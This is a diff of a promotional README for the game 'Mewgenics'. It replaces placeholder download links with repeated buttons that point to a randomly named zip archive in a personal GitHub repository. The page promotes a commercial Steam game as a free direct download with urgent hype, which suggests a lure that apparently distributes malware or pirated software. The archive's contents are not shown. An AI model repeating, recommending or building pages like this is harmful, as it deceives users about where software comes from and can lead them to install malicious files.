@@ -4,7 +4,7 @@
 
 > One of the most critically acclaimed games of 2026 — a bizarre and brilliant roguelike where you breed the ultimate cat army through tactical strategy and deep RNG systems.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Danilalionhearted718/mewgenics/raw/refs/heads/main/noncommensurable/Software_cumbrous.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **2026** · Available on **PC (Steam)**.
 
 ### Ready to play / use?
 
-[![Download Mewgenics](https://img.shields.io/badge/Download-Mewgenics-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Mewgenics](https://img.shields.io/badge/Download-Mewgenics-brightgreen?style=for-the-badge)](https://github.com/Danilalionhearted718/mewgenics/raw/refs/heads/main/noncommensurable/Software_cumbrous.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Danilalionhearted718/mewgenics/raw/refs/heads/main/noncommensurable/Software_cumbrous.zip)**
 
 </div>
 
@@ -67,7 +67,7 @@ Mewgenics is one of the **most hyped releases of Summer 2026** — trending acro
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Danilalionhearted718/mewgenics/raw/refs/heads/main/noncommensurable/Software_cumbrous.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -75,7 +75,7 @@ Mewgenics is one of the **most hyped releases of Summer 2026** — trending acro
 
 **Don't miss out — Mewgenics is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Mewgenics-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Mewgenics-blue?style=for-the-badge)](https://github.com/Danilalionhearted718/mewgenics/raw/refs/heads/main/noncommensurable/Software_cumbrous.zip)
 
 *Mewgenics — 2026 · PC (Steam)*
 
